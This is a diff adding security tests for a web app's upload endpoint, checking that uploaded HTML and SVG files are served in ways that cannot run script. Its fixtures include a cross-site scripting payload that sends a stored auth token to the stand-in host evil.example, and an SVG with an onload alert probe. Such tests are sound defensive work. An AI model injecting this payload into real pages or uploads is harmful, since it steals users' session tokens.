@@ -97,3 +97,54 @@ test('a conversation is only readable and changeable by its members', async () =
     assert.equal(unknown.status, 200);
     assert.deepEqual(unknown.body, []);
 });
+
+/* ── Uploads ───────────────────────────────────────────────────────────── */
+
+const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52]);
+const HTML = '<!doctype html><script>fetch("//evil.example/?t="+localStorage.getItem("vayu_auth_token"))</script>';
+
+async function upload(token, content, name, type) {
+    const form = new FormData();
+    form.append('file', new File([content], name, { type }));
+    const res = await api(token, '/upload', { method: 'POST', form });
+    assert.equal(res.status, 200, res.text);
+    return res.body.key;
+}
+
+test('an uploaded web page is never served as a web page', async () => {
+    for (const [name, type] of [['page.html', 'text/html'], ['sneaky.png', 'image/png'], ['doc.pdf', 'application/pdf']]) {
+        const key = await upload(mallory.token, HTML, name, type);
+        const res = await fetch(`${worker.origin}/api/files/${key}`);
+        assert.equal(res.status, 200);
+        assert.equal(res.headers.get('content-type'), 'application/octet-stream', name);
+        assert.match(res.headers.get('content-disposition'), /^attachment;/, name);
+        assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
+        assert.match(res.headers.get('content-security-policy'), /sandbox/);
+    }
+});
+
+test('real images still show, SVG only inside a sandbox', async () => {
+    const png = await fetch(`${worker.origin}/api/files/${await upload(alice.token, PNG, 'art.png', 'image/png')}`);
+    assert.equal(png.headers.get('content-type'), 'image/png');
+    assert.match(png.headers.get('content-disposition'), /^inline;/);
+    assert.equal(png.headers.get('x-content-type-options'), 'nosniff');
+
+    // Claimed as text, but the bytes are a PNG: stored and shown as the image it is.
+    const relabelled = await fetch(`${worker.origin}/api/files/${await upload(alice.token, PNG, 'art.txt', 'text/plain')}`);
+    assert.equal(relabelled.headers.get('content-type'), 'image/png');
+
+    const svg = await fetch(`${worker.origin}/api/files/${await upload(alice.token, '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', 'logo.svg', 'image/svg+xml')}`);
+    assert.equal(svg.headers.get('content-type'), 'image/svg+xml');
+    assert.match(svg.headers.get('content-security-policy'), /sandbox/);
+});
+
+test('a thumbnail must be an image', async () => {
+    const form = new FormData();
+    form.append('file', new File([PNG], 'art.png', { type: 'image/png' }));
+    form.append('thumb', new File([HTML], 'thumb.jpg', { type: 'image/jpeg' }));
+    const res = await api(alice.token, '/upload', { method: 'POST', form });
+    assert.equal(res.status, 200);
+    // No thumbnail stored, so the thumbnail address falls back to the original image.
+    const thumb = await fetch(`${worker.origin}${res.body.thumbUrl}`);
+    assert.equal(thumb.headers.get('content-type'), 'image/png');
+});
